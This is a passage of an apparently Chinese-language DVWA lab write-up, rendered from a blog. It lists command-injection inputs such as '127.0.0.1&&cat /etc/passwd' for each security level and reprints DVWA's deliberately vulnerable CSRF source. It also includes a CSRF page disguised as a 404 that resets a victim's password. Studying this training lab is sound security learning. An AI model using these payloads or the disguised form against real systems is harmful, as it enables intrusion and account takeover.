class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="low-2"><a class="markdownIt-Anchor" href="#low-2">#</a> Low</h3><ul><li><p>127.0.0.1</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425180350690.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425180350690"></p></li><li><p>127.0.0.1&amp;&amp; whoami</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425180709539.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425180709539"></p></li><li><p>127.0.0.1&amp;&amp; pwd</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425182713991.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425182713991"></p></li><li><p>127.0.0.1&amp;&amp;ls …/…/</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183108288.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425183108288"></p></li><li><p>127.0.0.1&amp;&amp;cat …/…/php.ini</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183656452.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425183656452"></p></li><li><p>127.0.0.1&amp;&amp;cat /etc/passwd</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183851680.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425183851680"></p></li></ul><h3 id="medium-2"><a class="markdownIt-Anchor" href="#medium-2">#</a> Medium</h3><ul><li><p>127.0.0.1&amp; ls</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184026503.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425184026503"></p></li><li><p>127.0.0.1&amp; cat /etc/passwd</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184132006.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425184132006"></p></li></ul><h3 id="high-2"><a class="markdownIt-Anchor" href="#high-2">#</a> High</h3><ul><li>127.0.0.1 |ls</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184427077.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425184427077"></p><hr><h2 id="cross-site-request-forgery-csrf"><a class="markdownIt-Anchor" href="#cross-site-request-forgery-csrf">#</a> Cross Site Request Forgery (CSRF)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># CSRF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Impossible CSRF Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input</span></span><br><span class="line">    <span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> );</span><br><span class="line">    <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_curr</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// It does!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = stripslashes( <span class="variable">$pass_new</span> );</span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># High CSRF Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Medium CSRF Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Low CSRF Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="low-3"><a class="markdownIt-Anchor" href="#low-3">#</a> Low</h3><ul><li>做个网页</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>是兄弟就来砍我<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.23.133/dvwa/vulnerabilities/csrf/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;是兄弟就来砍我&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-size:40px;&quot;</span>&gt;</span>404<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-size:20px;&quot;</span>&gt;</span>Page not Found!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>包信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change HTTP/1.1</span><br><span class="line">Host: 192.168.23.133</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.23.133/dvwa/vulnerabilities/csrf/</span><br><span class="line">Cookie: security=medium; PHPSESSID=otpvh75rdm983qnfc0scstgns0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><h3 id="medium-3"><a class="markdownIt-Anchor" href="#medium-3">#</a> Medium</h3><ul><li>Low 